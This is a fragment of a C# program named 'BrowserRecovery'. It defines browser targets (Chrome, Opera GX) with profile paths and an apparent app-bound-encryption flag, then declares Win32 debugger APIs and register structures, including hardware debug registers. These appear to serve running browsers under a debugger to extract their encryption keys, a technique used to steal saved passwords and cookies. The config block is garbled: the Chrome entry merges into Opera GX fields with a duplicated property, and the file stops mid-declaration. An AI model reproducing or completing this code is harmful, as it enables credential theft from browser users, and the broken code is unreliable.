using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Runtime.InteropServices;
using System.Text;
using System.Linq;
using System.Diagnostics;

namespace ConsoleApp1
{
    internal class BrowserRecovery
    {
        private class BrowserConfig
        {
            public string Name { get; set; }
            public string ProcessName { get; set; }
            public string[] ExePaths { get; set; }
            public string DllName { get; set; }
            public string[] UserDataSubdir { get; set; }
            public string OutputDir { get; set; }
            public string TempPrefix { get; set; }
            public bool UseR14 { get; set; }
            public bool UseRoaming { get; set; }
            public bool HasAbe { get; set; }
        }

        private static readonly List<BrowserConfig> Configs = new List<BrowserConfig>
        {
            new BrowserConfig
            {
                Name = "Google Chrome",
                ProcessName = "chrome.exe",
                ExePaths = new[]
                {
                    @"C:\Program Files\Google\Chrome\Application\chrome.exe",
                    @"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"
                },
                DllName = "chrome.dll",
                UserDataSubdir = new[] { "Google", "Chrome", "User Data" },
                OutputDir = "chrome",
                TempPrefix = "chrome_tmp",
                UseR14 = false,

                UserDataSubdir = new[] { "Opera Software", "Opera GX Stable" },
                OutputDir = "operagx",
                TempPrefix = "operagx_tmp",
                UseR14 = false,
                UseRoaming = true,
                HasAbe = false
            }
        };

        #region Win32 P/Invoke

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public uint dwProcessId;
            public uint dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct STARTUPINFO
        {
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public ushort wShowWindow;
            public ushort cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Explicit)]
        public struct DEBUG_EVENT
        {
            [FieldOffset(0)]
            public uint dwDebugEventCode;
            [FieldOffset(4)]
            public uint dwProcessId;
            [FieldOffset(8)]
            public uint dwThreadId;
            [FieldOffset(16)] // Alignment padding for x64
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 160)]
            public byte[] u;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct LOAD_DLL_DEBUG_INFO
        {
            public IntPtr hFile;
            public IntPtr lpBaseOfDll;
            public uint dwDebugInfoFileOffset;
            public uint nDebugInfoSize;
            public IntPtr lpImageName;
            public ushort fUnicode;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct EXCEPTION_DEBUG_INFO
        {
            public EXCEPTION_RECORD ExceptionRecord;
            public uint dwFirstChance;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct EXCEPTION_RECORD
        {
            public uint ExceptionCode;
            public uint ExceptionFlags;
            public IntPtr ExceptionRecordPtr;
            public IntPtr ExceptionAddress;
            public uint NumberParameters;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 15)]
            public IntPtr[] ExceptionInformation;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct M128A
        {
            public ulong Low;
            public long High;
        }

        [StructLayout(LayoutKind.Explicit, Size = 1232)]
        public struct CONTEXT64
        {
            [FieldOffset(0x30)] public uint ContextFlags;
            [FieldOffset(0x34)] public uint MxCsr;
            [FieldOffset(0x38)] public ushort SegCs;
            [FieldOffset(0x3A)] public ushort SegDs;
            [FieldOffset(0x3C)] public ushort SegEs;
            [FieldOffset(0x3E)] public ushort SegFs;
            [FieldOffset(0x40)] public ushort SegGs;
            [FieldOffset(0x42)] public ushort SegSs;
            [FieldOffset(0x44)] public uint EFlags;
            [FieldOffset(0x48)] public ulong Dr0;
            [FieldOffset(0x50)] public ulong Dr1;
            [FieldOffset(0x58)] public ulong Dr2;
            [FieldOffset(0x60)] public ulong Dr3;
            [FieldOffset(0x68)] public ulong Dr6;
            [FieldOffset(0x70)] public ulong Dr7;
            [FieldOffset(0x78)] public ulong Rax;
            [FieldOffset(0x80)] public ulong Rcx;
            [FieldOffset(0x88)] public ulong Rdx;
            [FieldOffset(0x90)] public ulong Rbx;
            [FieldOffset(0x98)] public ulong Rsp;
            [FieldOffset(0xA0)] public ulong Rbp;
            [FieldOffset(0xA8)] public ulong Rsi;
            [FieldOffset(0xB0)] public ulong Rdi;
            [FieldOffset(0xB8)] public ulong R8;
            [FieldOffset(0xC0)] public ulong R9;
            [FieldOffset(0xC8)] public ulong R10;
            [FieldOffset(0xD0)] public ulong R11;
            [FieldOffset(0xD8)] public ulong R12;
            [FieldOffset(0xE0)] public ulong R13;
            [FieldOffset(0xE8)] public ulong R14;
            [FieldOffset(0xF0)] public ulong R15;
            [FieldOffset(0xF8)] public ulong Rip;
        }

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool CreateProcess(
            string lpApplicationName,
            string lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            [In] ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WaitForDebugEvent(out DEBUG_EVENT lpDebugEvent, uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool ContinueDebugEvent(uint dwProcessId, uint dwThreadId, uint dwContinueStatus);

        [DllImport("kernel32.dll", SetLastError = true)]
